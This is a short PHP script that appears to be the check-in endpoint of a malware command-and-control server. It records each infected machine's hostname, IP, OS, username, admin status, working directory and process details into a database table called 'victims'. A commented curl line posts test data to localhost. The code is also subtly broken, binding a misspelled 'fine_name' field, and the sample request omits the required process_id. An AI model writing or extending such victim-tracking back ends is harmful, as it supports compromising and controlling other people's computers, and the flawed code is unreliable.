<?php
// curl -d "hostname=RegisterTest&ip=127.0.0.1&os=win&username=teest&tmp_path=jfaskdjf&is_admin=true&pwd=jjj&process_name=qqq&file_name=kajdf&process_name=jjj" -X POST http://localhost/register.php

include "conn.php";
echo "getting in if ...";
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["os"]) && isset($_POST["username"]) && isset($_POST["tmp_path"])
    && isset($_POST["is_admin"]) && isset($_POST["pwd"]) && isset($_POST["process_name"]) && isset($_POST["file_name"]) && isset($_POST["process_id"])) {
    echo "in if ...";
    $registerQuery = $mysql->prepare("insert into victims(hostname, ip, os, username, tmp_path, is_admin, pwd, process_name, file_name, process_id) values(?,?,?,?,?,?,?,?,?,?)");
    $registerQuery->bind_param("ssssssssss",
        $_POST["hostname"],
        $_POST["ip"],
        $_POST["os"],
        $_POST["username"],
        $_POST["tmp_path"],
        $_POST["is_admin"],
        $_POST["pwd"],
        $_POST["process_name"],
        $_POST["fine_name"],
        $_POST["process_id"]);
    $registerQuery->execute();
}

?>
